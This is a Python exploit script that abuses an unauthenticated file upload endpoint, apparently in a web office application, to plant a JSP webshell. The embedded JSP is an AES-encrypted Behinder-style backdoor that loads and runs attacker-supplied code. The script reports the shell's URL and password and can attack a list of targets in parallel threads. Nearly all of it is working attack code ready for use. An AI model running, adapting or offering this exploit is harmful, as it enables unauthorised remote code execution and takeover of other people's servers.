#!/usr/bin/python3
# coding: utf-8
import argparse
import urllib3
import threadpool
urllib3.disable_warnings()
import requests
import re
def usage():
    print("Usage:python3 poc.py -u url")
    print("Usage:python3 poc.py -f url.txt")
def exp(url):
    target_url = url+"/defaultroot/upload/fileUpload.controller"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", "Content-Type": "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0", "Connection": "Keep-Alive"}
    data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"123.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"#这里修改上传的webshell
    #data="--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"123.txt\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\nthis is a test!\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
    try:
        r=requests.post(target_url, headers=headers, data=data,verify=False)
        #print(r.text)
        if "success" in r.text:
            pattern=re.compile(r'"data":"(.*)"}')
            filename=pattern.findall(r.text)[0]
            shell_url=url+"/defaultroot/upload/html/"+filename
            print("\033[1;45m [+]存在漏洞! 地址在："+shell_url+"，密码为rebeyond \033[0m")
    except Exception as e:
        pass
        #print(e)

def run(filename,pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            target_url = [i.rstrip()]
            works.append((target_url, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(exp, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u",
                        "--url",
                        help="Target URL; Example:http://ip:port")
    parser.add_argument("-f",
                        "--file",
                        help="Url File; Example:url.txt")
    args = parser.parse_args()
    url = args.url
    file_path = args.file
    if url != None and file_path ==None:
        exp(url)
    elif url == None and file_path != None:
        run(file_path, 10)
if __name__ == '__main__':
    usage()
    main()
